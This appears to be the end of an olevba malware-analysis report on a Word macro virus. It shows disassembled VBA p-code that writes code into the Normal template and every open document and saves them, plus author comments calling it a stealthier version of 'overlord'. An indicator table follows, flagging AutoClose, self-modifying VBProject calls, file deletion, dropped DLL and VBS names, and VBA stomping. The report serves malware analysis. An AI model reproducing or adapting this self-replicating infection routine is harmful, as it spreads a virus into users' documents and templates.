' 	ArgsMemCall Show 0x0000 
' Line #151:
' Line #152:
' 	Ld Application 
' 	MemLd ShowVisualBasicEditor 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #153:
' 	LitDI2 0x0001 
' 	Ld codeNT 
' 	LitStr 0x0006 "Module"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #154:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #155:
' Line #156:
' 	Ld Docnumber 
' 	LitDI2 0x0001 
' 	Ge 
' 	IfBlock 
' Line #157:
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Docnumber 
' 	For 
' Line #158:
' 	LitDI2 0x0001 
' 	Ld CodeAD 
' 	LitStr 0x0006 "Module"
' 	Ld X 
' 	ArgsLd Documents 0x0001 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #159:
' 	Ld X 
' 	ArgsLd Documents 0x0001 
' 	MemLd FullName 
' 	Ld X 
' 	ArgsLd Documents 0x0001 
' 	ArgsMemCall SaveAs 0x0001 
' Line #160:
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	NextVar 
' Line #161:
' 	EndIfBlock 
' Line #162:
' 	EndIfBlock 
' Line #163:
' 	EndSub 
' Line #164:
' Line #165:
' 	QuoteRem 0x0000 0x004F "Put this code in a module called "Module". This is another version of overlord."
' Line #166:
' 	QuoteRem 0x0000 0x0049 "It uses a different stealth mechanism. Again however not perfect stealth,"
' Line #167:
' 	QuoteRem 0x0000 0x002A "but perhaps also a nice attempt i hope :)."
' Line #168:
' Line #169:
' Line #170:
' Line #171:
' Line #172:
' Line #173:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|write               |May write to a file (if combined with Open)  |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|FileCopy            |May copy a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |tempad.dll          |Executable file name                         |
|IOC       |tempnt.dll          |Executable file name                         |
|IOC       |b.vbs               |Executable file name                         |
|IOC       |b.dll               |Executable file name                         |
|IOC       |himem.dll           |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

